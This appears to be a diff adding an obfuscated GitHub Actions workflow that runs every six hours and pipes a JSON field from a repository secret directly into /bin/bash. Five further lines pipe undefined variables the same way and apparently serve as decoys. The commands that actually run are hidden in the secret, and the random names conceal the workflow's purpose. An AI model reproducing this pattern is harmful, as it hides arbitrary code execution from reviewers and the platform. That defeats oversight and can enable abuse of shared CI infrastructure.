@@ -1,0 +1,23 @@
+name: songqingppp
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songqingppp
+        env:
+          e7: ${{ secrets.e7 }}
+        run: |
+          echo $e7 | jq -r .xye6630 | /bin/bash
+          echo $ywm529 | jq -r .olfx101 | /bin/bash
+          echo $ib30 | jq -r .djmaz4 | /bin/bash
+          echo $nbiqo79736 | jq -r .cvqx61790 | /bin/bash
+          echo $ks785 | jq -r .i90 | /bin/bash
+          echo $zogv901 | jq -r .nm0 | /bin/bash
+
